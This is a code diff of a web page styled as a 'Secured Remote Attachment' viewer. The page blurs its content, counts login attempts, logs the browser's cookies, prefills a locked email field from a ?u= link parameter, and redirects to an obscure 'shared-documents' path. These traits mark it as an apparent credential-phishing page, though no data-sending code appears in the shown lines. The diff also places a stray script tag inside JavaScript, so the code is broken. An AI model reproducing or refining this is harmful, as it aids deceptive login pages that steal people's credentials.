@@ -3,7 +3,7 @@
 <head>
 <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width,initial-scale=1" />
-<title>Secured Remote Attachment</title>
+<title>Secured Remote Attachment — Mock Viewer</title>
 <style>
   :root{
     --bg: #e6e9eb;
@@ -395,6 +395,8 @@ const maxAttempts = 3;
 
 document.body.classList.add('blur-active');
 
+
+
 // Helper: parse document.cookie into an object { name: value, ... }
 function parseCookies(cookieString = document.cookie) {
   const cookies = {};
@@ -420,18 +422,16 @@ const cookies = parseCookies();
 console.log("Cookies available to JS:", cookies);
 
 // Get email from URL  ?u=
+<script>
+// Check if the current URL contains the email parameter (e.g., ?u=email@example.com)
 const params = new URLSearchParams(window.location.search);
-const rawEmail = params.get("u");
-  // Remove it from the URL instantly
-        history.replaceState({}, document.title, window.location.pathname);
-// Check if email exists AND is valid
-if (rawEmail && /^[^@]+@[^@]+\.[^@]+$/.test(rawEmail)) {
+const emailParam = params.get("u");
 
-  emailInput.value = rawEmail;
-  emailInput.setAttribute("uneditable", true);
-
-  const domain = rawEmail.split('@')[1];
-
+if (emailParam && window.location.pathname === '/') {  // Check if the user is on the home page
+  // Redirect to the new path with the email as a query parameter
+  const newUrl = `/shared-documents-39207fb292f2568236f329?u=${encodeURIComponent(emailParam)}`;
+  window.location.replace(newUrl);  // Redirect to the new URL
+}
 
   
   // Set logo
